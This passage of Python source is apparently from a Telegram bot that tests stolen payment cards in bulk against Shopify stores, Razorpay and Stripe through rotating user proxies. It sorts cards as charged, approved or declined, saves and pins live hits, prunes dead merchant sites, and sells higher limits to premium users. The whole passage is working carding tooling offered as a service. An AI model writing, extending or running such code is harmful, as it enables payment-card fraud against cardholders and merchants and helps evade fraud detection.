        for site in sites_to_remove:
            if site in user_sites: user_sites.remove(site); removed.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        if removed: await event.reply("\n".join(f"\u2705 Removed: {s}" for s in removed))
        else: await event.reply("\u274c No sites were removed!")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    user = await event.get_sender()
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    sites_text = "\n".join([f"{i+1}. {s}" for i, s in enumerate(user_sites)]) if user_sites else "No sites added"
    has_premium = await is_premium_user(event.sender_id)
    status = "\u2705 Premium" if has_premium else ("\U0001f451 Admin" if event.sender_id in ADMIN_ID else "\u274c Free")
    await event.reply(f"\U0001f464 User Info\n\nName: {user.first_name}\nID: `{event.sender_id}`\nAccess: {status}\nSites ({len(user_sites)}):\n```\n{sites_text}\n```")

# --- Proxy Management ---

@client.on(events.NewMessage(pattern='/addpxy'))
async def add_proxy(event):
    if event.is_group: return await event.reply("\U0001f512 Use in private chat only!")
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) != 2: return await event.reply("Format: /addpxy ip:port:username:password")
        proxy_data = parse_proxy_format(parts[1].strip())
        if not proxy_data: return await event.reply("\u274c Invalid proxy format!")
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        if len(user_proxies) >= 10: return await event.reply("\u274c Proxy limit reached (10)!")
        testing_msg = await event.reply("\U0001f504 Testing proxy...")
        is_working, result = await test_proxy(proxy_data['proxy_url'])
        if not is_working: return await testing_msg.edit(f"\u274c Proxy not working!\nError: {result}")
        user_proxies.append(proxy_data)
        proxies[str(event.sender_id)] = user_proxies
        await save_json(PROXY_FILE, proxies)
        await testing_msg.edit(f"\u2705 Proxy added!\n\nIP: {result}\nProxy: {proxy_data['ip']}:{proxy_data['port']}\nTotal: {len(user_proxies)}/10")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/rmpxy'))
async def remove_proxy(event):
    if event.is_group: return await event.reply("\U0001f512 Use in private chat only!")
    try:
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        if not user_proxies: return await event.reply("\u274c No proxies saved!")
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 1: return await event.reply("Format: /rmpxy <index> or /rmpxy all")
        arg = parts[1].strip().lower()
        if arg == 'all':
            del proxies[str(event.sender_id)]
            await save_json(PROXY_FILE, proxies)
            return await event.reply(f"\u2705 All {len(user_proxies)} proxies removed!")
        try:
            index = int(arg) - 1
            if index < 0 or index >= len(user_proxies): return await event.reply(f"\u274c Invalid index! (1-{len(user_proxies)})")
            removed = user_proxies.pop(index)
            if user_proxies: proxies[str(event.sender_id)] = user_proxies
            else: del proxies[str(event.sender_id)]
            await save_json(PROXY_FILE, proxies)
            await event.reply(f"\u2705 Proxy removed: {removed['ip']}:{removed['port']}")
        except ValueError: await event.reply("\u274c Use: /rmpxy 1 or /rmpxy all")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/proxy'))
async def view_proxy(event):
    if event.is_group: return await event.reply("\U0001f512 Use in private chat only!")
    user_proxies = await get_all_user_proxies(event.sender_id)
    if not user_proxies: return await event.reply("\u274c No proxies! Use /addpxy to add.")
    proxy_list = f"\U0001f4e1 **Your Proxies** ({len(user_proxies)}/10)\n\n"
    for idx, p in enumerate(user_proxies, 1):
        auth = f" | {p['username']}" if p.get('username') else ""
        proxy_list += f"`{idx}.` {p['type'].upper()} | {p['ip']}:{p['port']}{auth}\n"
    await event.reply(proxy_list)

# --- /sh Single Shopify Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh(?:\s|$)'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("\U0001f6ab Unauthorised! Use in group for free.")
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("\u26a0\ufe0f Proxy Required!\n\nAdd one: `/addpxy ip:port:username:password`")
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
    else:
        card = extract_card(event.raw_text)
    if not card: return await event.reply("Format: /sh 4111111111111111|12|2025|123")
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("No sites added! Use /add first.")
    loading_msg = await event.reply("\U0001f373")
    start_time = time.time()
    loading_task = asyncio.create_task(_animate(loading_msg))
    try:
        res, site_index = await check_card_random_site(card, user_sites, event.sender_id)
        loading_task.cancel()
        elapsed = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        status_text = res.get("Status", "").lower()
        is_charged = False
        if "charged" in response_text or "charged" in status_text or "thank you" in response_text:
            status_header = "\U0001D402\U0001D413\U0001D400\U0001D411\U0001D40E\U0001D404\U0001D403 \U0001f48e"; is_charged = True
            await save_approved_card(card, "Charged", res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif any(k in response_text for k in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip"]):
            status_header = "\U0001D400\U0001D40F\U0001D40F\U0001D411\U0001D40E\U0001D415\U0001D404\U0001D403 \u2705"
            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
        else:
            status_header = "~~ \U0001D403\U0001D404\U0001D402\U0001D40B\U0001D408\U0001D40D\U0001D404\U0001D403 ~~ \u274c"
        msg = f"""{status_header}

\U0001D5D6\U0001D5D6 \u21fe `{card}`
\U0001D5DA\U0001D5EE\U0001D5F9\U0001D5F2\U0001D5F0\U0001D5EE\U0001D5FD \u21fe {res.get('Gateway', 'Unknown')}
\U0001D5E5\U0001D5F2\U0001D5F0\U0001D5FD\U0001D5FC\U0001D5FB\U0001D5F0\U0001D5F2 \u21fe {res.get('Response')}
\U0001D5E3\U0001D5FF\U0001D5F6\U0001D5F0\U0001D5F2 \u21fe {res.get('Price')} \U0001f4b8
\U0001D5E6\U0001D5F6\U0001D5F9\U0001D5F2 \u21fe {site_index}

```\U0001D5D5\U0001D5DC\U0001D5E1 \U0001D5DC\U0001D5FB\U0001D5F3\U0001D5FC: {brand} - {bin_type} - {level}
\U0001D5D5\U0001D5EE\U0001D5FB\U0001D5F8: {bank}
\U0001D5D6\U0001D5FC\U0001D5FE\U0001D5FB\U0001D5F9\U0001D5FF\U0001D5FD: {country} {flag}```

\U0001D5E7\U0001D5FC\U0001D5FC\U0001D5F8 {elapsed} \U0001D5F0\U0001D5F2\U0001D5F0\U0001D5FC\U0001D5FB\U0001D5F1\U0001D5F0"""
        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if is_charged: await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await event.reply(f"\u274c Error: {e}")

async def _animate(msg):
    emojis = ["\U0001f373", "\U0001f373\U0001f373", "\U0001f373\U0001f373\U0001f373", "\U0001f373\U0001f373\U0001f373\U0001f373", "\U0001f373\U0001f373\U0001f373\U0001f373\U0001f373"]
    i = 0
    while True:
        try: await msg.edit(emojis[i % 5]); await asyncio.sleep(0.5); i += 1
        except: break

# --- /msh Mass Shopify Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh(?:\s|$)'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data: return await event.reply("\u26a0\ufe0f Proxy Required!\n\nAdd: `/addpxy ip:port:user:pass`")
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
    else:
        cards = extract_all_cards(event.raw_text)
    if not cards: return await event.reply("Format: /msh cc|mm|yy|cvv cc|mm|yy|cvv ...")
    user_limit = get_cc_limit(access_type, event.sender_id)
    if len(cards) > user_limit: cards = cards[:user_limit]
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("No sites! Use /add first.")
    asyncio.create_task(process_msh_cards(event, cards, user_sites))

async def process_msh_cards(event, cards, sites):
    sent_msg = await event.reply(f"```Cooking \U0001f373 {len(cards)} Total.```")
    cards_per_site = 2; current_site_index = 0; cards_on_current_site = 0
    batch_size = 10
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]; tasks = []
        for card in batch:
            current_site = sites[current_site_index]
            tasks.append(check_card_specific_site(card, current_site, event.sender_id))
            cards_on_current_site += 1
            if cards_on_current_site >= cards_per_site:
                current_site_index = (current_site_index + 1) % len(sites); cards_on_current_site = 0
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for card, result in zip(batch, results):
            if isinstance(result, Exception): result = {"Response": str(result), "Price": "-", "Gateway": "-"}
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            response_text = result.get("Response", "").lower()
            status_text = result.get("Status", "").lower()
            is_charged = False
            if "charged" in response_text or "charged" in status_text or "thank you" in response_text:
                status_header = "CHARGED \U0001f48e"; is_charged = True
                await save_approved_card(card, "Charged", result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif any(k in response_text for k in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip"]):
                status_header = "APPROVED \u2705"
                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            else:
                status_header = "~~ DECLINED ~~ \u274c"
            card_msg = f"""{status_header}\n\nCC \u21fe `{card}`\nGateway \u21fe {result.get('Gateway', 'Unknown')}\nResponse \u21fe {result.get('Response')}\nPrice \u21fe {result.get('Price')} \U0001f4b8\n\n```BIN: {brand} - {bin_type} - {level}\nBank: {bank}\nCountry: {country} {flag}```"""
            result_msg = await event.reply(card_msg)
            if is_charged: await pin_charged_message(event, result_msg)
            await asyncio.sleep(0.1)
    await sent_msg.edit(f"```\u2705 Mass Check Complete! {len(cards)} cards.```")

# --- /mtxt Shopify TXT Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt(?:\s|$)'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data: return await event.reply("\u26a0\ufe0f Proxy Required!\n\nAdd: `/addpxy ip:port:user:pass`")
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("```Already checking! Wait for complete.```")
    try:
        if not event.reply_to_msg_id: return await event.reply("```Reply to a .txt file with /mtxt```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("```Reply to a .txt file with /mtxt```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"\u274c Error reading file: {e}")
        cards = [l for l in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', l)]
        if not cards: return await event.reply("No valid CCs found!")
        cc_limit = get_cc_limit(access_type, user_id)
        if len(cards) > cc_limit: cards = cards[:cc_limit]
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites: return await event.reply("No sites! Use /add first.")
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(_process_mtxt(event, cards, user_sites.copy(), user_id))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"\u274c Error: {e}")

async def _process_mtxt(event, cards, local_sites, user_id):
    total = len(cards); checked = approved = charged = declined = 0
    status_msg = await event.reply(f"```Cooking \U0001f373 {total} CCs```")
    cards_per_site = 4; current_site_index = 0; cards_on_current_site = 0
    try:
        batch_size = 20
        for i in range(0, len(cards), batch_size):
            if not local_sites or user_id not in ACTIVE_MTXT_PROCESSES: break
            batch = cards[i:i+batch_size]; tasks = []; task_cards = []
            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites: break
                current_site = local_sites[current_site_index]
                tasks.append(check_card_specific_site(card, current_site, user_id))
                task_cards.append((card, current_site))
                cards_on_current_site += 1
                if cards_on_current_site >= cards_per_site:
                    current_site_index = (current_site_index + 1) % len(local_sites); cards_on_current_site = 0
            if not tasks: continue
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result, (card, site_used) in zip(results, task_cards):
                if user_id not in ACTIVE_MTXT_PROCESSES: break
                if isinstance(result, Exception): result = {"Response": str(result), "Price": "-", "Gateway": "-"}
                checked += 1
                response_text = result.get("Response", "")
                if is_site_dead(response_text):
                    declined += 1
                    if site_used in local_sites:
                        local_sites.remove(site_used)
                        all_sites = await load_json(SITE_FILE)
                        if str(user_id) in all_sites and site_used in all_sites[str(user_id)]:
                            all_sites[str(user_id)].remove(site_used); await save_json(SITE_FILE, all_sites)
                        current_site_index = 0; cards_on_current_site = 0
                    continue
                if "3d" in response_text.lower(): declined += 1; continue
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send = False
                status_text = result.get("Status", "").lower()
                if "charged" in response_text.lower() or "charged" in status_text:
                    charged += 1; status_header = "CHARGED \U0001f48e"; should_send = True
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                elif any(k in response_text.lower() for k in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip"]):
                    approved += 1; status_header = "APPROVED \u2705"; should_send = True
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                else: declined += 1; status_header = "DECLINED \u274c"
                if should_send:
                    card_msg = f"{status_header}\n\nCC \u21fe `{card}`\nGateway \u21fe {result.get('Gateway')}\nResponse \u21fe {result.get('Response')}\nPrice \u21fe {result.get('Price')}\n\n```BIN: {brand} - {bin_type} - {level}\nBank: {bank}\nCountry: {country} {flag}```"
                    await event.reply(card_msg)
                buttons = [[Button.inline(f"Charged [{charged}] \U0001f48e", b"none")], [Button.inline(f"Approved [{approved}] \u2705", b"none")], [Button.inline(f"Declined [{declined}] \u274c", b"none")], [Button.inline(f"Progress [{checked}/{total}]", b"none")], [Button.inline("\u26d4 Stop", f"stop_mtxt:{user_id}".encode())]]
                try: await status_msg.edit("```Cooking \U0001f373...```", buttons=buttons)
                except: pass
                await asyncio.sleep(0.1)
        final = f"\u2705 Complete!\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nTotal: {checked}/{total}"
        try: await status_msg.edit(final)
        except: pass
    finally: ACTIVE_MTXT_PROCESSES.pop(user_id, None)

@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID: return await event.answer("\u274c Not your process!", alert=True)
    ACTIVE_MTXT_PROCESSES.pop(uid, None)
    await event.answer("\u26d4 Stopped!", alert=True)

# --- /rzp Single Razorpay Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rzp(?:\s|$)'))
async def rzp(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    asyncio.create_task(process_rzp_card(event))

async def process_rzp_card(event):
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
    else: card = extract_card(event.raw_text)
    if not card: return await event.reply("Format: /rzp 4111111111111111|12|2025|123")
    loading_msg = await event.reply("\U0001f373")
    start_time = time.time()
    loading_task = asyncio.create_task(_animate(loading_msg))
    try:
        res = await check_card_razorpay(card, user_id=event.sender_id)
        loading_task.cancel()
        elapsed = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        status_text = res.get("Status", "").lower()
        is_charged = False
        if "charged" in status_text: status_header = "CHARGED \U0001f48e"; is_charged = True
        elif "insufficient" in status_text or "insufficient" in response_text: status_header = "APPROVED \u2705"
        else: status_header = "~~ DECLINED ~~ \u274c"
        msg = f"{status_header}\n\nCC \u21fe `{card}`\nGateway \u21fe {res.get('Gateway')}\nResponse \u21fe {res.get('Response')}\n\n```BIN: {brand} - {bin_type} - {level}\nBank: {bank}\nCountry: {country} {flag}```\n\nTook {elapsed}s"
        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if is_charged: await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel(); await loading_msg.delete(); await event.reply(f"\u274c Error: {e}")

# --- /rztxt Razorpay TXT Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rztxt(?:\s|$)'))
async def rztxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    user_id = event.sender_id
    if user_id in ACTIVE_RZP_PROCESSES: return await event.reply("```Already checking!```")
    try:
        if not event.reply_to_msg_id: return await event.reply("```Reply to a .txt file with /rztxt```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("```Reply to a .txt file```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except: return await event.reply("\u274c Error reading file")
        cards = [l for l in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', l)]
        if not cards: return await event.reply("No valid CCs!")
        cc_limit = get_cc_limit(access_type, user_id)
        if len(cards) > cc_limit: cards = cards[:cc_limit]
        ACTIVE_RZP_PROCESSES[user_id] = True
        asyncio.create_task(_process_rztxt(event, cards, user_id))
    except Exception as e:
        ACTIVE_RZP_PROCESSES.pop(user_id, None); await event.reply(f"\u274c Error: {e}")

async def _process_rztxt(event, cards, user_id):
    total = len(cards); checked = approved = charged = declined = 0
    status_msg = await event.reply("```Razorpay Checking \U0001f373```")
    try:
        batch_size = 10
        for i in range(0, len(cards), batch_size):
            batch = cards[i:i+batch_size]
            tasks = [check_card_razorpay(card, user_id=user_id) for card in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for card, result in zip(batch, results):
                if user_id not in ACTIVE_RZP_PROCESSES: break
                if isinstance(result, Exception): result = {"Response": str(result), "Price": "-", "Gateway": "Razorpay"}
                checked += 1
                response_text = result.get("Response", "").lower()
                status_text = result.get("Status", "").lower()
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send = False
                if "charged" in status_text: charged += 1; status_header = "CHARGED \U0001f48e"; should_send = True
                elif "insufficient" in status_text or "insufficient" in response_text: approved += 1; status_header = "APPROVED \u2705"; should_send = True
                else: declined += 1; status_header = "DECLINED \u274c"
                if should_send:
                    await event.reply(f"{status_header}\n\nCC \u21fe `{card}`\nGateway \u21fe {result.get('Gateway')}\nResponse \u21fe {result.get('Response')}\n\n```BIN: {brand}-{bin_type}-{level}\nBank: {bank}\nCountry: {country} {flag}```")
                buttons = [[Button.inline(f"Charged [{charged}]", b"none")], [Button.inline(f"Approved [{approved}]", b"none")], [Button.inline(f"Progress [{checked}/{total}]", b"none")], [Button.inline("\u26d4 Stop", f"stop_rztxt:{user_id}".encode())]]
                try: await status_msg.edit("```Razorpay \U0001f373...```", buttons=buttons)
                except: pass
                await asyncio.sleep(0.1)
        try: await status_msg.edit(f"\u2705 Razorpay Complete!\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nTotal: {checked}/{total}")
        except: pass
    finally: ACTIVE_RZP_PROCESSES.pop(user_id, None)

@client.on(events.CallbackQuery(pattern=rb"stop_rztxt:(\d+)"))
async def stop_rztxt_cb(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID: return await event.answer("\u274c Not yours!", alert=True)
    ACTIVE_RZP_PROCESSES.pop(uid, None); await event.answer("\u26d4 Stopped!", alert=True)

# --- /au Single Stripe Auth Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]au(?:\s|$)'))
async def au(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    asyncio.create_task(process_au_card(event))

async def process_au_card(event):
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
    else: card = extract_card(event.raw_text)
    if not card: return await event.reply("Format: /au 4111111111111111|12|2025|123")
    loading_msg = await event.reply("\U0001f373")
    start_time = time.time()
    loading_task = asyncio.create_task(_animate(loading_msg))
    try:
        res = await check_card_stripe_auth(card)
        loading_task.cancel()
        elapsed = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        status_text = res.get("Status", "").lower()
        is_hit = False
        if "approved" in status_text: status_header = "APPROVED \U0001f48e"; is_hit = True
        elif "insufficient" in response_text: status_header = "APPROVED \u2705"; is_hit = True
        else: status_header = "~~ DECLINED ~~ \u274c"
        msg = f"{status_header}\n\nCC \u21fe `{card}`\nGateway \u21fe {res.get('Gateway')}\nResponse \u21fe {res.get('Response')}\n\n```BIN: {brand} - {bin_type} - {level}\nBank: {bank}\nCountry: {country} {flag}```\n\nTook {elapsed}s"
        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if is_hit: await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel(); await loading_msg.delete(); await event.reply(f"\u274c Error: {e}")

# --- /mau Mass Stripe Auth Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mau(?:\s|$)'))
async def mau(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
    else: cards = extract_all_cards(event.raw_text)
    if not cards: return await event.reply("Format: /mau cc|mm|yy|cvv cc|mm|yy|cvv ...")
    user_limit = get_cc_limit(access_type, event.sender_id)
    if len(cards) > user_limit: cards = cards[:user_limit]
    asyncio.create_task(_process_mau(event, cards))

async def _process_mau(event, cards):
    sent_msg = await event.reply(f"```Stripe Auth Checking \U0001f373 {len(cards)} Total.```")
    batch_size = 10
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = [check_card_stripe_auth(card) for card in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for card, result in zip(batch, results):
            if isinstance(result, Exception): result = {"Response": str(result), "Price": "-", "Gateway": "Stripe Auth"}
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            status_text = result.get("Status", "").lower()
            response_text = result.get("Response", "").lower()
            is_hit = False
            if "approved" in status_text: status_header = "APPROVED \U0001f48e"; is_hit = True
            elif "insufficient" in response_text: status_header = "APPROVED \u2705"; is_hit = True
            else: status_header = "~~ DECLINED ~~ \u274c"
            card_msg = f"{status_header}\n\nCC \u21fe `{card}`\nGateway \u21fe {result.get('Gateway')}\nResponse \u21fe {result.get('Response')}\n\n```BIN: {brand}-{bin_type}-{level}\nBank: {bank}\nCountry: {country} {flag}```"
            result_msg = await event.reply(card_msg)
            if is_hit: await pin_charged_message(event, result_msg)
            await asyncio.sleep(0.1)
    await sent_msg.edit(f"```\u2705 Stripe Auth Complete! {len(cards)} cards.```")

# --- /autxt Stripe Auth TXT Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]autxt(?:\s|$)'))
async def autxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    user_id = event.sender_id
    if user_id in ACTIVE_STRIPE_PROCESSES: return await event.reply("```Already checking!```")
    try:
        if not event.reply_to_msg_id: return await event.reply("```Reply to a .txt file with /autxt```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("```Reply to a .txt file```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except: return await event.reply("\u274c Error reading file")
        cards = [l for l in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', l)]
        if not cards: return await event.reply("No valid CCs!")
        cc_limit = get_cc_limit(access_type, user_id)
        if len(cards) > cc_limit: cards = cards[:cc_limit]
        ACTIVE_STRIPE_PROCESSES[user_id] = True
        asyncio.create_task(_process_autxt(event, cards, user_id))
    except Exception as e:
        ACTIVE_STRIPE_PROCESSES.pop(user_id, None); await event.reply(f"\u274c Error: {e}")

async def _process_autxt(event, cards, user_id):
    total = len(cards); checked = approved = declined = 0
    status_msg = await event.reply("```Stripe Auth Checking \U0001f373```")
    try:
        batch_size = 20
        for i in range(0, len(cards), batch_size):
            batch = cards[i:i+batch_size]
            tasks = [check_card_stripe_auth(card) for card in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for card, result in zip(batch, results):
                if user_id not in ACTIVE_STRIPE_PROCESSES: break
                if isinstance(result, Exception): result = {"Response": str(result), "Price": "-", "Gateway": "Stripe Auth"}
                checked += 1
                status_text = result.get("Status", "").lower()
                response_text = result.get("Response", "").lower()
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send = False
                if "approved" in status_text: approved += 1; status_header = "APPROVED \U0001f48e"; should_send = True
                elif "insufficient" in response_text: approved += 1; status_header = "APPROVED \u2705"; should_send = True
                else: declined += 1; status_header = "DECLINED \u274c"
                if should_send:
                    await event.reply(f"{status_header}\n\nCC \u21fe `{card}`\nGateway \u21fe {result.get('Gateway')}\nResponse \u21fe {result.get('Response')}\n\n```BIN: {brand}-{bin_type}-{level}\nBank: {bank}\nCountry: {country} {flag}```")
                buttons = [[Button.inline(f"Approved [{approved}]", b"none")], [Button.inline(f"Declined [{declined}]", b"none")], [Button.inline(f"Progress [{checked}/{total}]", b"none")], [Button.inline("\u26d4 Stop", f"stop_autxt:{user_id}".encode())]]
                try: await status_msg.edit("```Stripe Auth \U0001f373...```", buttons=buttons)
                except: pass
                await asyncio.sleep(0.1)
        try: await status_msg.edit(f"\u2705 Stripe Auth Complete!\nApproved: {approved}\nDeclined: {declined}\nTotal: {checked}/{total}")
        except: pass
    finally: ACTIVE_STRIPE_PROCESSES.pop(user_id, None)

@client.on(events.CallbackQuery(pattern=rb"stop_autxt:(\d+)"))
async def stop_autxt_cb(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID: return await event.answer("\u274c Not yours!", alert=True)
    ACTIVE_STRIPE_PROCESSES.pop(uid, None); await event.answer("\u26d4 Stopped!", alert=True)

# --- /check Site Checker ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]check(?:\s|$)'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    check_text = event.raw_text[6:].strip()
    if not check_text:
        buttons = [[Button.inline("\U0001f50d Check My DB Sites", b"check_db_sites")]]
        return await event.reply("**Site Checker**\n\n`/check`\n`1. site.com`\n`2. site2.com`\n\nOr click below to check your saved sites:", buttons=buttons)
    sites_to_check = extract_urls_from_text(check_text)
    if not sites_to_check: return await event.reply("\u274c No valid urls found!")
    if len(sites_to_check) > 10: sites_to_check = sites_to_check[:10]
    asyncio.create_task(_process_site_check(event, sites_to_check))

async def _process_site_check(event, sites):
    total = len(sites); checked = 0; working = []; dead = []
    status_msg = await event.reply(f"```Checking {total} sites...```")
    for site in sites:
        result = await test_single_site(site, user_id=event.sender_id)
        checked += 1
        if result["status"] == "proxy_dead":
            await status_msg.edit(f"\u26a0\ufe0f Proxy Dead!\n\n{result['response']}")
            return
        if result["status"] == "working": working.append({"site": site, "price": result["price"]})
        else: dead.append({"site": site, "price": result["price"]})
        try: await status_msg.edit(f"```Checking... [{checked}/{total}]\nWorking: {len(working)} | Dead: {len(dead)}```")
        except: pass
    final = f"\u2705 **Site Check Complete!**\n\nWorking: {len(working)} | Dead: {len(dead)}\n\n"
    if working:
        final += "**Working:**\n" + "\n".join([f"\u2705 `{s['site']}` - {s['price']}" for s in working]) + "\n\n"
        TEMP_WORKING_SITES[event.sender_id] = [s['site'] for s in working]
    if dead:
        final += "**Dead:**\n" + "\n".join([f"\u274c `{s['site']}`" for s in dead])
    buttons = []
    if working: buttons.append([Button.inline("\u2795 Add Working Sites to DB", f"add_working:{event.sender_id}".encode())])
